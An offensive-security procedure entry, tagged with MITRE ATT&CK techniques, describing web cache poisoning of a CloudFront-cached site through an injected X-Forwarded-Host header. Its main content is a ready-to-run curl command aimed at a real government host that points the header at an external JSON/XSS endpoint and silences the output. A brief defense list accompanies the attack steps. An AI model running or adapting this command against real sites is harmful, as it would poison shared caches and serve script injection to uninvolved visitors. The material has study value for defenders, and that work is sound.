---
tags:
  - cache-poisoning
  - header-injection
  - aws
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-poison-cloudfront-cache]]'
platforms:
  - Web
  - AWS
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 6470e72c-deda-42d9-bf21-4359ed4dc2ad
created_at: '2025-12-13T09:00:34.679Z'
updated_at: '2025-12-13T09:00:34.679Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Poison CloudFront Cache with Malicious X-Forwarded-Host

## Summary

This procedure involves sending a crafted HTTP request to poison the CloudFront cache by injecting a malicious X-Forwarded-Host header, which is reflected in HTML attributes and allows control over resource URLs.

## Description

The target server trusts the X-Forwarded-Host header and uses it to set attributes like data-site-root in the HTML response. By setting this to an attacker-controlled value, the cache is poisoned, affecting subsequent requests. This is used in web cache poisoning attacks combined with CDNs like CloudFront, leading to persistent vulnerabilities such as XSS.

## Requirements

1. Access to the target URL over HTTPS
2. curl tool installed
3. Knowledge of the cache key parameters (e.g., ?dontpoisoneveryone=6 to limit impact)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize X-Forwarded-Host headers on the server side
- Configure CDN to ignore or strip untrusted headers
- Monitor for anomalous header values in logs

## Objectives

1. Poison the cache with malicious attributes
2. Enable subsequent injection attacks
3. Demonstrate cache manipulation for persistent effects

## Instructions

### Step 1: Send Poisoning Request

**Context**: Execute a GET request with the malicious header to inject the value into the cached response.

**Command** ([[commands/curl-poison-cloudfront-cache]]):
```bash
curl -i -s -k -X 'GET' -H 'Host: catalog.data.gov' -H 'Accept-Encoding: gzip, deflate' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H 'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H 'Connection: close' 'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null
```

> This command poisons the cache silently by redirecting output to /dev/null, setting X-Forwarded-Host to point to a malicious JSON endpoint.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-poison-cloudfront-cache]]

## Tools Used

- [[tools/curl]]

## Tags

- cache-poisoning
- header-injection
